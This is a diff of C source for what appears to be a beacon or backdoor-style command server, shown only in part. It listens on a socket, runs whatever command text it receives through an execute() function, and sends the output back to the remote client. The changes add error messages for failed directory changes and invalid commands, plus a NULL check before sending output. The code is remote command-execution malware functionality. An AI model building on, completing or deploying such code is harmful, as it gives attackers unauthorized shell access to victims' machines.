@@ -25,8 +25,13 @@ void sizeErr(int bruh) {
     send(new_socket, error, strlen(error), 0);
 }
 
-void cdError(int bruhhh) {
+void cdError(int bruhh) {
     error = (RED "ERROR: Something went wrong! Unable to change directory...\n" RESET);
+    send(new_socket, error, strlen(error), 0);
+}
+
+void cmdErr(int bruhhh) {
+    error = (RED "ERROR: Potentially invalid command!\n" RESET);
     send(new_socket, error, strlen(error), 0);
 }
 
@@ -72,7 +77,7 @@ int main(int argc, char const* argv[]) {
         exit(EXIT_FAILURE);
     }
 
-    // Forcefully attaching socket to the port 8080
+    // Forcefully attaching socket to the port
     if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
         perror("Failed to attach socket to port");
         exit(EXIT_FAILURE);
@@ -81,7 +86,7 @@ int main(int argc, char const* argv[]) {
     address.sin_addr.s_addr = INADDR_ANY;
     address.sin_port = htons(PORT);
 
-    // Forcefully attaching socket to the port 8080
+    // Forcefully attaching socket to the port
     if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
         perror("Failed to bind socket to port");
         exit(EXIT_FAILURE);
@@ -117,17 +122,20 @@ int main(int argc, char const* argv[]) {
         }
         
         char *output = execute(buffer);
-        printf("%s", output);
 
         if (received <= 0) {
             printf("Beacon died or something went wrong...");
-            //break;
         }
 
-        if (send(new_socket, output, strlen(output), 0) < 0) {
-            printf("Unable to send output...");
-            sizeErr(0);
+        if (output != NULL) {
+            if (send(new_socket, output, strlen(output), 0) < 0) {
+                printf("Unable to send output...");
+                sizeErr(0);
+            }
+        } else {
+            cmdErr(0);
         }
+        
     }
 
     // closing the connected socket
